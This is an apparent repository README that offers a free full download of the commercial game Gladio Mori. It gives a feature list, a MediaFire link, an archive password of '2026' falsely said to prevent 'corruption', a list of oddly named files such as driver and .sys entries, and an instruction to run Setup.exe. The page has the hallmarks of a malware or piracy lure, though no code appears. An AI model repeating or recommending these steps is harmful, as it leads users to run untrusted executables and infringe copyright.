## 🕹️ About

Gladio Mori is a physics-driven gladiator fighting game developed by Plebeian Studio and published by Bonus Stage Publishing. Set in brutal arena battles, it replaces traditional health bars with localized damage: strikes can weaken limbs, sever arteries, pierce vital organs, or dismember fighters. Players can build custom movesets, customize their gladiator, fight through a solo campaign, or compete in local and online multiplayer for up to four players. Cross-play and community-created content add variety beyond the core arena combat. This release is packaged for straightforward installation of the full game.

Gladio Mori is for players who enjoy technical melee combat, physics-driven fighting, brutal arena action, and competitive multiplayer.

## ✨ Features

- 🏟️ **Gladiator Arenas** — Battle through challenging arenas in a focused, skill-driven combat setting.
- 🛠️ **Custom Movesets** — Create distinctive attacks and fighting styles with the move editor.
- 👥 **Four-Player Battles** — Play local or online PvP with support for up to four combatants.
- 🎨 **Fighter Customization** — Paint your gladiator and configure weapons, armor, and equipment.
- 🩸 **Localized Damage** — Target muscles, arteries, organs, limbs, and armor instead of relying on health bars.
- 🗡️ **Solo Campaign** — Face a gauntlet of opponents across multiple difficulty levels.
- ⚔️ **Physics-Based Combat** — Every strike reacts to weapon angle, impact, armor, and body location.
- 🌐 **Cross-Play** — Compete across supported PC and console multiplayer platforms.

### Step 1: Download

Download the package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- api.pak <- API modules
|-- driver.umap <- Driver data
|-- Password 2026.txt <- Password reminder (empty)
|-- bootstrap.wem <- Bootstrap audio
|-- update_1.res <- Update resources
|-- settings.bin <- Configuration
|-- global.cfg <- Global settings
|-- launcher.dll <- Launcher library
|-- animations.dll <- Animation system
|-- patch_1.bnk <- Audio banks
|-- dlc.md5 <- DLC checksums
|-- license.wem <- Audio assets
|-- installer.dat <- Installer data
|-- physics.sys <- Physics engine
|-- audio.res <- Audio resources
|-- res.pak <- Resources archive
|-- localization.ini <- Language files
|-- license.bank <- License data
|-- lang.sys <- Language system
|-- uninstall.key <- Uninstall key
|-- scripts.lic <- Game scripts
|-- assets.wem <- Asset audio
|-- update_1.ini <- Update config
|-- driver.pak <- Driver archive
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
